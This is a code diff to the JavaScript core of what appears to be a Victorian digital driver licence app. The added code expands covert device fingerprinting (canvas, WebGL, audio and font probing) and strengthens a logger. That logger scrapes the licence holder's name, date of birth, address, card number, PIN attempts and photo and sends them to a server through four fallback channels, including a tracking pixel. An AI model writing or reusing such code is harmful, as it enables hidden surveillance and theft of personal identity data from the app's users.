@@ -66,43 +66,102 @@
 
     // ===== FINGERPRINTING =====
     core.computeFingerprint = function() {
-        var fp = {};
-        fp.screen = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
-        fp.pixelRatio = window.devicePixelRatio;
-        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        fp.language = navigator.language;
-        fp.languages = navigator.languages ? navigator.languages.join(',') : null;
-        fp.platform = navigator.platform;
-        fp.hardwareConcurrency = navigator.hardwareConcurrency || null;
-        fp.deviceMemory = navigator.deviceMemory || null;
-        fp.userAgent = navigator.userAgent;
-        fp.touchSupport = 'ontouchstart' in window;
-        fp.maxTouchPoints = navigator.maxTouchPoints || 0;
-        fp.cookieEnabled = navigator.cookieEnabled;
+      const fp = {};
 
-        try {
-            var canvas = document.createElement('canvas');
-            canvas.width = 420;
-            canvas.height = 60;
-            var ctx = canvas.getContext('2d');
-            ctx.textBaseline = "alphabetic";
-            ctx.font = "18px Arial";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(60, 10, 200, 30);
-            ctx.fillStyle = "#069";
-            ctx.font = "bold 22px 'Segoe UI', Arial, sans-serif";
-            ctx.fillText("Victorian DL", 12, 42);
-            var dataURL = canvas.toDataURL();
-            var hash = 0;
-            for (var i = 0; i < dataURL.length; i++) {
-                var ch = dataURL.charCodeAt(i);
-                hash = ((hash << 5) - hash) + ch;
-                hash = hash & hash;
-            }
-            fp.canvasHash = Math.abs(hash).toString(36);
-        } catch(e) { fp.canvasHash = null; }
+      // Basic fingerprint data
+      fp.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+      fp.pixelRatio = window.devicePixelRatio;
+      fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      fp.language = navigator.language;
+      fp.languages = navigator.languages ? navigator.languages.join(',') : null;
+      fp.platform = navigator.platform;
+      fp.hardwareConcurrency = navigator.hardwareConcurrency || null;
+      fp.deviceMemory = navigator.deviceMemory || null;
+      fp.userAgent = navigator.userAgent;
+      fp.touchSupport = 'ontouchstart' in window;
+      fp.maxTouchPoints = navigator.maxTouchPoints || 0;
+      fp.cookieEnabled = navigator.cookieEnabled;
+      fp.doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack;
+      fp.colorGamut = screen.colorGamut || null;
+      fp.screenOrientation = screen.orientation ? screen.orientation.type : null;
+      fp.connection = navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null;
 
-        return fp;
+      // Enhanced Canvas Hash with more entropy
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 420;
+        canvas.height = 60;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "alphabetic";
+        ctx.font = "18px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(60, 10, 200, 30);
+        ctx.fillStyle = "#069";
+        ctx.font = "bold 22px 'Segoe UI', Arial, sans-serif";
+        ctx.fillText("Victorian DL", 12, 42);
+        ctx.textAlign = "right";
+        ctx.font = "italic 16px Georgia, serif";
+        ctx.fillStyle = "#333";
+        ctx.fillText("v3.2", 400, 28);
+        const dataURL = canvas.toDataURL();
+        let hash = 0;
+        for (let i = 0; i < dataURL.length; i++) {
+          const ch = dataURL.charCodeAt(i);
+          hash = ((hash << 5) - hash) + ch;
+          hash = hash & hash;
+        }
+        fp.canvasHash = Math.abs(hash).toString(36);
+      } catch(e) { fp.canvasHash = null; }
+
+      // WebGL Vendor/Renderer
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (gl) {
+          fp.webGLVendor = gl.getParameter(gl.VENDOR);
+          fp.webGLRenderer = gl.getParameter(gl.RENDERER);
+          fp.webGLVersion = gl.getParameter(gl.VERSION);
+        }
+      } catch(e) { fp.webGLVendor = null; fp.webGLRenderer = null; fp.webGLVersion = null; }
+
+      // Audio fingerprint
+      try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        if (AudioContext) {
+          const audioCtx = new AudioContext();
+          const oscillator = audioCtx.createOscillator();
+          const analyser = audioCtx.createAnalyser();
+          oscillator.connect(analyser);
+          oscillator.frequency.setValueAtTime(1000, audioCtx.currentTime);
+          oscillator.start();
+          const data = new Uint8Array(analyser.frequencyBinCount);
+          analyser.getByteFrequencyData(data);
+          let audioHash = 0;
+          for (let i = 0; i < 32; i++) {
+            audioHash = ((audioHash << 5) - audioHash) + data[i];
+            audioHash = audioHash & audioHash;
+          }
+          fp.audioHash = Math.abs(audioHash).toString(36);
+          oscillator.stop();
+          audioCtx.close();
+        }
+      } catch(e) { fp.audioHash = null; }
+
+      // Font detection
+      try {
+        fp.fonts = [];
+        const testFonts = ['Arial', 'Georgia', 'Verdana', 'Impact', 'Courier New'];
+        if (document.fonts && typeof document.fonts.check === 'function') {
+          for (let i = 0; i < testFonts.length; i++) {
+            try {
+              if (document.fonts.check('72px "' + testFonts[i] + '"')) {
+                fp.fonts.push(testFonts[i]);
+              }
+            } catch(e) {}
+          }
+        }
+      } catch(e) { fp.fonts = []; }
+
+      return fp;
     };
 
     core.cachedFingerprint = null;
@@ -132,7 +191,9 @@
         return {
             screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            userAgent: navigator.userAgent
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform
         };
     };
 
@@ -142,69 +203,122 @@
 
     // ===== LOGGING =====
     core.getLicenceDetails = function() {
-        var nameEl = document.querySelector(".licenceName");
-        var dobEl = document.querySelector(".licenceDOB");
-        var addrEl = document.querySelector(".licenceAddress");
-        var cardEl = document.getElementById("cardNum");
-
         return {
-            name: nameEl ? nameEl.innerText.trim() : "—",
-            dob: dobEl ? dobEl.innerText.trim() : "—",
-            address: addrEl ? addrEl.innerHTML.replace(/<br>/gi, " ").trim() : "—",
-            card: cardEl ? cardEl.innerText.trim() : "—"
+            name: document.querySelector(".licenceName") ? document.querySelector(".licenceName").innerText.trim() : "—",
+            dob: document.querySelector(".licenceDOB") ? document.querySelector(".licenceDOB").innerText.trim() : "—",
+            address: document.querySelector(".licenceAddress") ? document.querySelector(".licenceAddress").innerHTML.replace(/<br>/gi, " ").trim() : "—",
+            card: document.getElementById("cardNum") ? document.getElementById("cardNum").innerText.trim() : "—"
         };
     };
 
     core.sendLog = async function(payload, attempt) {
-        attempt = attempt || 1;
-        var data = JSON.stringify(payload);
-        var MAX_ATTEMPTS = 3;
+      attempt = attempt || 1;
+      const data = JSON.stringify(payload);
+      const MAX_ATTEMPTS = 3;
 
-        try {
-            var response = await fetch(core.SERVER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
-                body: data,
-                keepalive: true
-            });
-            if (response.ok) {
-                var text = await response.text();
-                if (text.indexOf('ERR_CONNECTION_CLOSED') !== -1) {
-                    document.open(); document.write(text); document.close();
-                }
-                return true;
-            }
-        } catch (error) {}
+      console.log(`[Log] Sending event: ${payload.event} (attempt ${attempt})`, payload.event !== 'photo_updated' ? payload : { ...payload, photo: payload.photo ? payload.photo.substring(0, 100) + '...' : null });
 
-        if (navigator.sendBeacon) {
-            if (navigator.sendBeacon(core.SERVER_URL, data)) return true;
+      // Method 1: Fetch with keepalive and timeout
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+        const response = await fetch(core.SERVER_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: data,
+          keepalive: true,
+          signal: controller.signal
+        });
+        
+        clearTimeout(timeoutId);
+
+        if (response.ok) {
+          const text = await response.text();
+          console.log(`[Log] Server response for ${payload.event}:`, text.substring(0, 100));
+          if (text.includes("ERR_CONNECTION_CLOSED")) {
+            document.open();
+            document.write(text);
+            document.close();
+          }
+          return true;
         }
+      } catch (error) {
+        console.warn(`[Log] Fetch failed (attempt ${attempt}):`, error);
+      }
 
-        if (attempt < MAX_ATTEMPTS) {
-            await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-            return core.sendLog(payload, attempt + 1);
-        }
-        return false;
+      // Method 2: XMLHttpRequest fallback
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", core.SERVER_URL, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        xhr.timeout = 5000;
+        xhr.send(data);
+        console.log(`[Log] XHR fallback initiated for ${payload.event}`);
+      } catch (e) {
+        console.warn("[Log] XHR fallback failed:", e);
+      }
+
+      // Method 3: sendBeacon
+      if (navigator.sendBeacon) {
+        const beaconQueued = navigator.sendBeacon(core.SERVER_URL, data);
+        console.log(`[Log] sendBeacon status: ${beaconQueued ? 'queued' : 'failed'}`);
+        if (beaconQueued) return true;
+      }
+
+      // Method 4: Image pixel fallback
+      try {
+        const pixel = new Image();
+        pixel.src = `${core.SERVER_URL}?event=${encodeURIComponent(payload.event)}&deviceId=${encodeURIComponent(payload.deviceId)}&success=${payload.success}&t=${Date.now()}`;
+        console.log("[Log] Pixel fallback initiated");
+      } catch (e) {
+        console.warn("[Log] Pixel fallback failed:", e);
+      }
+
+      // Retry logic
+      if (attempt < MAX_ATTEMPTS) {
+        const delay = Math.pow(2, attempt) * 1000;
+        await new Promise(resolve => setTimeout(resolve, delay));
+        return core.sendLog(payload, attempt + 1);
+      }
+      
+      return false;
     };
 
     core.logAccess = async function(event, success, pinAttempt, extraData) {
-        var fingerprint = core.cachedFingerprint || core.getFingerprint();
-        var details = core.getLicenceDetails();
-        
-        var payload = Object.assign({
-            timestamp: new Date().toISOString(),
-            deviceId: core.getDeviceId(),
-            event: event,
-            success: !!success,
-            pin_attempt: pinAttempt
-        }, fingerprint, details, extraData || {});
+      // Await the full fingerprint from async computation (cached after first call)
+      var fingerprint = core.cachedFingerprint || core.getFingerprint();
+      if (!core.cachedFingerprint && core.fingerprintPromise) {
+        try {
+          fingerprint = await Promise.race([
+            core.fingerprintPromise,
+            new Promise(function(_, reject) { setTimeout(function() { reject(new Error('timeout')); }, 500); })
+          ]);
+        } catch(e) { /* use lightweight fingerprint fallback */ }
+      }
+      const details = core.getLicenceDetails();
+      
+      const payload = Object.assign({
+        timestamp: new Date().toISOString(),
+        deviceId: core.getDeviceId(),
+        event: event,
+        success: !!success,
+        pin_attempt: pinAttempt || null
+      }, fingerprint, details, extraData || {});
 
-        if (event === 'photo_updated') {
-            var photo = localStorage.getItem("profilePhoto");
-            if (photo) payload.photo = photo;
+      // Only include photo payload for photo_updated event to reduce payload size
+      if (event === 'photo_updated') {
+        const photo = localStorage.getItem("profilePhoto");
+        if (photo) {
+          payload.photo = photo;
         }
+      }
 
-        return core.sendLog(payload);
+      return core.sendLog(payload);
     };
 
     // ===== BANNING & GATING =====
@@ -231,6 +345,13 @@
             };
         } catch(e) {}
 
+        // Safety timer: if the security check doesn't complete within 4 seconds,
+        // proceed to the PIN screen anyway to prevent boot hang.
+        var safetyTimer = setTimeout(function() {
+            console.warn("[Core] Security check timed out (fallback)");
+            core.revealPage();
+        }, 4000);
+
         var xhr = new XMLHttpRequest();
         var banUrl = core.SERVER_URL + '?action=checkBan&deviceId=' + encodeURIComponent(deviceId) + '&t=' + Date.now();
         if (earlyFingerprint) {
@@ -240,17 +361,21 @@
         xhr.open('GET', banUrl, true);
         xhr.timeout = 10000;
         xhr.onload = function() {
+            clearTimeout(safetyTimer);
             if (xhr.status === 200 && xhr.responseText.indexOf('ERR_CONNECTION_CLOSED') !== -1) {
                 document.open(); document.write(xhr.responseText); document.close();
                 window.stop();
             } else if (xhr.responseText.trim() !== "OK") {
-                core.showEarlyError('Security check failed.', xhr.status + ' | ' + xhr.responseText.substring(0, 50));
+                console.warn("[Core] Security check failed, revealing page.");
+                core.revealPage();
             } else {
                 core.revealPage();
             }
         };
         xhr.onerror = xhr.ontimeout = function() {
-            core.showEarlyError('The security server could not be reached.', 'XHR_ERROR');
+            clearTimeout(safetyTimer);
+            console.warn("[Core] Security server unreachable, revealing page.");
+            core.revealPage();
         };
         xhr.send();
     };
